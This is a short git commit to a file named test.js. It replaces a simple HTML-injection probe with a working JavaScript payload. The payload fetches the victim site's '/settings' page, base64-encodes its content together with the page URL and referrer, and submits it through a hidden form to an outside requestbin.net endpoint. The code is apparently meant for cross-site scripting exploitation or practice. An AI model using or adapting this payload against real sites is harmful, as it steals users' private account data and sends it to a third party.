da1bd893d99abbaae188fb2ca15a002a14fab1f1
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 20:38:18 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,13 @@
-document.getElementById("name").value = "<b>Hello</b>"
-document.forms[0].submit();
+fetch("/settings").then(function(response) {
+    response.text().then(function(back) {
+        f = document.createElement("form");
+        i = document.createElement("input");
+        f.method = 'post';
+        f.action = 'http://requestbin.net/r/rj93qcrj';
+        i.name = 'data';
+        i.value = btoa(encodeURI(back)+window.location.href+document.referrer);
+        f.appendChild(i);
+        document.body.appendChild(f);
+        f.submit();
+    })
+})
